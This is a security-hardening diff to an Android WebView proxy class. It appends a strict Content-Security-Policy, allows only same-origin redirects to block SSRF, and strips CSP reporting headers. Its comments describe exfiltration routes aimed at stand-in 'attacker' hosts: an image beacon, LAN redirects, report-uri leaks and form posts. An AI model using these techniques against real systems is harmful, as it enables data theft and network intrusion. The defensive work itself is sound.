@@ -15,8 +15,9 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 import java.nio.charset.Charset;
 import java.nio.charset.StandardCharsets;
-import java.util.HashMap;
+import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
 import java.util.Map;
@@ -29,6 +30,52 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
     static final int TRANSACTION_RESPONSE_MAX_BYTES = 512 * 1024;
     static final long RESOURCE_STREAM_RESPONSE_MAX_BYTES = 512L * 1024L * 1024L;
     static final long RESOURCE_STREAM_TOTAL_MAX_BYTES = 4L * 1024L * 1024L * 1024L;
+    /**
+     * The sandbox Home applies to EVERY bridged document, appended to whatever
+     * the upstream node sent rather than substituted for it.
+     *
+     * <p>Home connects to PUBLIC nodes it does not control, so the upstream
+     * policy is attacker-controlled input. An earlier revision of this gate
+     * added the full baseline only when the node sent NO policy, and merely
+     * appended {@code connect-src} when it sent one — reasoning that Core's own
+     * policy would already bound images, scripts and media. That inferred
+     * "Core's sandbox is present" from the mere presence of a CSP field, which
+     * trusts precisely the party this policy exists to contain: a hostile node
+     * sending {@code default-src * data: blob:} is nonempty, so it would have
+     * received connection-only treatment and kept
+     * {@code <img src="https://attacker/?d=…">} — a data-exfiltration beacon
+     * that needs no WebSocket and no fetch.
+     *
+     * <p>Because CSP policies INTERSECT, appending this unconditionally can
+     * only ever tighten a cooperative node's policy. There is no case in which
+     * Home benefits from applying less.
+     *
+     * <p>Mirrors Core's own rendered-document policy, minus any external
+     * origin: same-origin, data: and blob: only.
+     *
+     * <p><b>Scope.</b> This bounds egress to THIRD parties. It cannot stop a
+     * page from sending data to the serving node itself, which is same-origin
+     * through the proxy by construction — see {@link #prepareProxiedResponseHeaders}.
+     */
+    static final String HOME_QDN_MINIMUM_POLICY =
+        "default-src 'self' 'unsafe-inline' 'unsafe-eval'; " +
+        "font-src 'self' data:; " +
+        "media-src 'self' data: blob:; " +
+        "img-src 'self' data: blob:; " +
+        "worker-src 'self' blob:; " +
+        "connect-src 'self' blob:; " +
+        // NONE of these fall back to default-src, so omitting them leaves an
+        // egress channel open that needs no fetch and no WebSocket:
+        //   form-action — an auto-submitted POST form to any origin. Android
+        //     does not call shouldOverrideUrlLoading for POST, so it is not
+        //     interceptable either.
+        //   webrtc — CSP3 governs this separately; a TURN username can carry
+        //     data out on its own.
+        //   object-src / base-uri — plugin documents and base-tag rewrites.
+        "form-action 'self'; " +
+        "base-uri 'self'; " +
+        "object-src 'none'; " +
+        "webrtc 'block';";
     // Round 6: moved to QdnRenderProxy so its exact-URL document-identity
     // normalization (which must ignore this exact param) and this class's own
     // use of it as the actual carried credential can never drift apart — see
@@ -295,9 +342,10 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
      * no cooperation from the app was needed to bring it along — and (before
      * round 5) this method would still return {@code true} for that
      * RouteKind.RENDER route, arming the attacker's response with the live
-     * signing/account-read bridge AND stripping its Content-Security-Policy
-     * (both live in {@code fetchUpstream}'s same {@code bridgeToken != null}
-     * branch), under the still-authorized APP identity.
+     * signing/account-read bridge and, at that time, stripping its
+     * Content-Security-Policy (both lived in {@code fetchUpstream}'s same
+     * {@code bridgeToken != null} branch), under the still-authorized APP
+     * identity.
      *
      * <p>Round 6 (owner-directed redesign, ending the round-2/4/5
      * identifier-confusion class): for a homeV2 origin, this no longer asks
@@ -312,8 +360,10 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
      * render, a different app, a different identifier via path OR query, or
      * even the SAME app/identifier's own deeper in-app sub-route reached by a
      * hard navigation, all fail this exact comparison and get neither the
-     * token nor injection nor a stripped CSP — regardless of how "close" they
-     * look. A v1 (non-{@code homeV2}) origin has no shared, per-tab document
+     * token nor injection — regardless of how "close" they look. Every
+     * response retains its upstream CSP, and an injected response also gains
+     * Home's same-origin connection policy. A v1 (non-{@code homeV2}) origin
+     * has no shared, per-tab document
      * to protect this way at all (see {@code QdnRenderProxy.authorize}'s
      * {@code authorizedDocumentUrl} parameter doc comment: each v1 proxy
      * origin is dedicated to the ONE resource the user explicitly opened), so
@@ -331,8 +381,9 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
      * `window.parent.postMessage({type:'qortium:qdn-request',...})` wire
      * protocol itself — it needs no help from the injected script, only the
      * token (already visible to it) and this method having wrongly said the
-     * response might be bridged. This method, and the CSP it therefore keeps
-     * intact for a route it refuses, is the actual enforcement — see
+     * response might be bridged. This method is the bridge-authority
+     * enforcement; CSP independently constrains outbound connections for the
+     * authorized document too. See
      * AppTabStage.tsx's liveResourcePathRef doc comment for why, given this
      * gate, that self-report is now UX/consistency defense-in-depth rather
      * than a security boundary of its own.
@@ -421,7 +472,7 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
             // shared origin) and for why round 6's exact-URL match cannot
             // break a legitimate embed, data read, or the tab's own initial
             // load. shouldInterceptRequest's own use of shouldCarryBridgeToken
-            // already refuses the bridge/CSP-removal for this response even
+            // already refuses bridge injection for this response even
             // without this check (that is the real enforcement — see this
             // class's shouldCarryBridgeToken doc comment for why the app's
             // own self-report can never be relied on instead); this is the
@@ -473,6 +524,126 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
         );
     }
 
+    /** Redirect hops allowed before a chain is treated as hostile. */
+    private static final int MAX_UPSTREAM_REDIRECTS = 3;
+
+    /**
+     * Opens the upstream request, following redirects ONLY back to the same
+     * origin Home authorized.
+     *
+     * <p>Automatic redirect following made the node's response an instruction
+     * about what Home should go and fetch. A public node Home does
+     * not control could answer a perfectly ordinary app request with
+     * {@code 302 Location: http://192.168.1.1/…} or a loopback address, and the
+     * proxy — running inside Home's process, on the user's device, inside the
+     * user's network — would fetch it and hand the body back to the app as
+     * that app's own same-origin content. That turns every Home user into an
+     * SSRF pivot into their own LAN.
+     *
+     * <p>Redirects are not refused outright, because a same-origin redirect is
+     * ordinary and legitimate (Core answers a directory-style path that way).
+     * Each hop must simply resolve back to the scheme, host and port Home
+     * already authorized. Stream-capability routes keep refusing every
+     * redirect, which is stricter and predates this.
+     *
+     * @return the connected upstream, or {@code null} if the chain left the
+     *         authorized origin, exceeded {@link #MAX_UPSTREAM_REDIRECTS}, or
+     *         sent an unusable {@code Location}.
+     */
+    private HttpURLConnection openUpstreamFollowingSameOriginRedirects(
+        WebResourceRequest request,
+        String upstreamUrl,
+        boolean streamCapability
+    )
+        throws IOException {
+        URL authorized = new URL(upstreamUrl);
+        URL target = authorized;
+
+        for (int hop = 0; hop <= MAX_UPSTREAM_REDIRECTS; hop += 1) {
+            HttpURLConnection connection = (HttpURLConnection) target.openConnection();
+
+            connection.setConnectTimeout(REQUEST_TIMEOUT_MS);
+            connection.setReadTimeout(REQUEST_TIMEOUT_MS);
+            // Never automatic: a hop is only taken after it has been checked.
+            connection.setInstanceFollowRedirects(false);
+            connection.setRequestMethod("HEAD".equalsIgnoreCase(request.getMethod()) ? "HEAD" : "GET");
+
+            for (Map.Entry<String, String> header : request.getRequestHeaders().entrySet()) {
+                String name = header.getKey();
+
+                if (
+                    name == null ||
+                    header.getValue() == null ||
+                    "Accept-Encoding".equalsIgnoreCase(name) ||
+                    "Host".equalsIgnoreCase(name)
+                ) {
+                    continue;
+                }
+
+                connection.setRequestProperty(name, header.getValue());
+            }
+
+            connection.setRequestProperty("Accept-Encoding", "identity");
+
+            int statusCode = connection.getResponseCode();
+
+            if (statusCode < 300 || statusCode >= 400) {
+                return connection;
+            }
+
+            // Stricter, pre-existing rule for the stream routes.
+            if (streamCapability) {
+                connection.disconnect();
+                return null;
+            }
+
+            String location = connection.getHeaderField("Location");
+            connection.disconnect();
+
+            if (location == null || location.trim().isEmpty()) {
+                return null;
+            }
+
+            URL next;
+
+            try {
+                // Resolved against the CURRENT hop, so a relative Location
+                // behaves as a browser would resolve it.
+                next = new URL(target, location.trim());
+            } catch (java.net.MalformedURLException malformed) {
+                return null;
+            }
+
+            if (!isSameOrigin(authorized, next)) {
+                return null;
+            }
+
+            target = next;
+        }
+
+        return null;
+    }
+
+    /** Scheme, host and port must all match; the default port is normalized. */
+    static boolean isSameOrigin(URL authorized, URL candidate) {
+        if (!authorized.getProtocol().equalsIgnoreCase(candidate.getProtocol())) {
+            return false;
+        }
+
+        if (authorized.getHost() == null || candidate.getHost() == null) {
+            return false;
+        }
+
+        if (!authorized.getHost().equalsIgnoreCase(candidate.getHost())) {
+            return false;
+        }
+
+        int authorizedPort = authorized.getPort() == -1 ? authorized.getDefaultPort() : authorized.getPort();
+        int candidatePort = candidate.getPort() == -1 ? candidate.getDefaultPort() : candidate.getPort();
+
+        return authorizedPort == candidatePort;
+    }
+
     private WebResourceResponse fetchUpstream(
         WebResourceRequest request,
         String upstreamUrl,
@@ -491,35 +662,17 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
         boolean shellStream
     )
         throws IOException {
-        HttpURLConnection connection = (HttpURLConnection) new URL(upstreamUrl).openConnection();
+        HttpURLConnection connection = openUpstreamFollowingSameOriginRedirects(
+            request,
+            upstreamUrl,
+            streamCapability
+        );
 
-        connection.setConnectTimeout(REQUEST_TIMEOUT_MS);
-        connection.setReadTimeout(REQUEST_TIMEOUT_MS);
-        connection.setInstanceFollowRedirects(!streamCapability);
-        connection.setRequestMethod("HEAD".equalsIgnoreCase(request.getMethod()) ? "HEAD" : "GET");
-
-        for (Map.Entry<String, String> header : request.getRequestHeaders().entrySet()) {
-            String name = header.getKey();
-
-            if (
-                name == null ||
-                header.getValue() == null ||
-                "Accept-Encoding".equalsIgnoreCase(name) ||
-                "Host".equalsIgnoreCase(name)
-            ) {
-                continue;
-            }
-
-            connection.setRequestProperty(name, header.getValue());
-        }
-
-        connection.setRequestProperty("Accept-Encoding", "identity");
-
-        int statusCode = connection.getResponseCode();
-        if (streamCapability && statusCode >= 300 && statusCode < 400) {
-            connection.disconnect();
+        if (connection == null) {
             return forbiddenResponse();
         }
+
+        int statusCode = connection.getResponseCode();
         String reasonPhrase = connection.getResponseMessage();
         String contentType = connection.getContentType();
         boolean inferredContentType = contentType == null || contentType.trim().isEmpty();
@@ -539,7 +692,9 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
             return forbiddenResponse();
         }
 
-        Map<String, String> responseHeaders = withoutContentTypeHeader(getResponseHeaders(connection));
+        Map<String, String> responseHeaders = prepareProxiedResponseHeaders(
+            withoutContentTypeHeader(getResponseHeaders(connection))
+        );
 
         if (
             streamCapability &&
@@ -614,12 +769,7 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
                 request.getUrl().getQueryParameter("homeV2Bridge")
             );
             responseBytes = injectQdnBridge(html, bridgeToken, homeV2Bridge).getBytes(charset);
-            removeHeader(responseHeaders, "Content-Length");
-            removeHeader(responseHeaders, "Content-Encoding");
-            removeHeader(responseHeaders, "Transfer-Encoding");
-            removeHeader(responseHeaders, "Content-Security-Policy");
-            removeHeader(responseHeaders, "X-Content-Security-Policy");
-            responseHeaders.put("Referrer-Policy", "no-referrer");
+            prepareInjectedHtmlResponseHeaders(responseHeaders);
 
             return new WebResourceResponse(
                 getMimeType(contentType),
@@ -962,9 +1112,118 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
                 continue;
             }
 
-            headers.put(header.getKey(), header.getValue().get(0));
+            headers.put(
+                header.getKey(),
+                serializeResponseHeaderValue(header.getKey(), header.getValue())
+            );
         }
 
+        return headers;
+    }
+
+    /**
+     * HttpURLConnection exposes repeated response fields as a value list. Most
+     * fields retain the existing first-value behavior, but each modern CSP
+     * value is an independently enforced policy and must not be discarded.
+     */
+    static String serializeResponseHeaderValue(String name, List<String> values) {
+        if ("Content-Security-Policy".equalsIgnoreCase(name)) {
+            return String.join(", ", values);
+        }
+
+        return values.get(0);
+    }
+
+    /**
+     * Adds Home's independent CSP policy to every response served through the
+     * synthetic QDN proxy. Applying this only to the injected top document is
+     * insufficient: a same-origin helper document or worker receives and
+     * enforces its own response policy, so it could otherwise become an egress
+     * relay for data received from the bridged parent.
+     *
+     * <p>Multiple CSP policies intersect in WebView. The upstream policy still
+     * applies in full, and Home additionally confines fetch/XHR/WebSocket
+     * connections to the synthetic app origin and blob URLs. This also keeps an
+     * older or custom node's bare {@code ws:} or {@code wss:} source from
+     * reopening arbitrary WebSocket access.</p>
+     */
+    /**
+     * Response headers that turn CSP itself into an egress channel.
+     *
+     * <p>A violation report is sent by the browser, not by page script, so
+     * Home's {@code connect-src} does not constrain it. A hostile node can
+     * send {@code Content-Security-Policy-Report-Only: script-src 'none'
+     * 'report-sample'; report-uri https://attacker/} and then read chunks of
+     * whatever the page puts in an inline script out of the violation reports
+     * — report-only does not even block the script. The reporting headers are
+     * therefore dropped outright, and reporting directives are removed from
+     * policies Home retains.
+     */
+    private static final String[] REPORTING_HEADERS = {
+        "Content-Security-Policy-Report-Only",
+        "X-Content-Security-Policy-Report-Only",
+        "Report-To",
+        "Reporting-Endpoints",
+        "NEL",
+    };
+
+    /** Strips `report-uri` / `report-to` directives from one retained policy. */
+    static String withoutReportingDirectives(String policy) {
+        StringBuilder kept = new StringBuilder();
+        for (String directive : policy.split(";")) {
+            String name = directive.trim().split("\\s+", 2)[0].toLowerCase(java.util.Locale.ROOT);
+            if (name.equals("report-uri") || name.equals("report-to")) continue;
+            if (directive.trim().isEmpty()) continue;
+            if (kept.length() > 0) kept.append("; ");
+            kept.append(directive.trim());
+        }
+        return kept.length() == 0 ? "" : kept + ";";
+    }
+
+    static Map<String, String> prepareProxiedResponseHeaders(Map<String, String> headers) {
+        for (String reportingHeader : REPORTING_HEADERS) {
+            removeHeader(headers, reportingHeader);
+        }
+        List<String> upstreamPolicies = new ArrayList<>();
+        java.util.Iterator<Map.Entry<String, String>> entries = headers.entrySet().iterator();
+
+        while (entries.hasNext()) {
+            Map.Entry<String, String> entry = entries.next();
+
+            if ("Content-Security-Policy".equalsIgnoreCase(entry.getKey())) {
+                if (entry.getValue() != null && !entry.getValue().trim().isEmpty()) {
+                    String retained = withoutReportingDirectives(entry.getValue().trim());
+                    if (!retained.isEmpty()) upstreamPolicies.add(retained);
+                }
+                entries.remove();
+            }
+        }
+
+        // ALWAYS append the full baseline, never a connection-only policy.
+        //
+        // Making this conditional on "did upstream send a policy?" was wrong,
+        // and wrong in a way that inverted its own justification: a HOSTILE
+        // node can send `default-src *` — nonempty, so Home would have added
+        // only connect-src, leaving images unbounded and a beacon available.
+        // Inferring "Core's sandbox is present" from the mere presence of a
+        // CSP field trusts exactly the party this policy exists to contain.
+        // Policies intersect, so appending the full baseline unconditionally
+        // can only ever tighten a cooperative node's policy.
+        upstreamPolicies.add(HOME_QDN_MINIMUM_POLICY);
+        headers.put("Content-Security-Policy", String.join(", ", upstreamPolicies));
+        return headers;
+    }
+
+    /**
+     * Removes entity metadata invalidated when Home rewrites an HTML body and
+     * injects its bridge. CSP is already preserved and strengthened for every
+     * proxy response by {@link #prepareProxiedResponseHeaders}.
+     */
+    static Map<String, String> prepareInjectedHtmlResponseHeaders(Map<String, String> headers) {
+        removeHeader(headers, "Content-Length");
+        removeHeader(headers, "Content-Encoding");
+        removeHeader(headers, "Transfer-Encoding");
+        setHeader(headers, "Referrer-Policy", "no-referrer");
         return headers;
     }
 
@@ -991,19 +1250,19 @@ public class QdnBridgeWebViewClient extends BridgeWebViewClient {
         return headers;
     }
 
-    private void removeHeader(Map<String, String> headers, String expectedName) {
-        String headerName = null;
+    private static void removeHeader(Map<String, String> headers, String expectedName) {
+        java.util.Iterator<String> names = headers.keySet().iterator();
 
-        for (String name : headers.keySet()) {
-            if (expectedName.equalsIgnoreCase(name)) {
-                headerName = name;
-                break;
+        while (names.hasNext()) {
+            if (expectedName.equalsIgnoreCase(names.next())) {
+                names.remove();
             }
         }
+    }
 
-        if (headerName != null) {
-            headers.remove(headerName);
-        }
+    private static void setHeader(Map<String, String> headers, String name, String value) {
+        removeHeader(headers, name);
+        headers.put(name, value);
     }
 
     private String getReasonPhrase(int statusCode) {
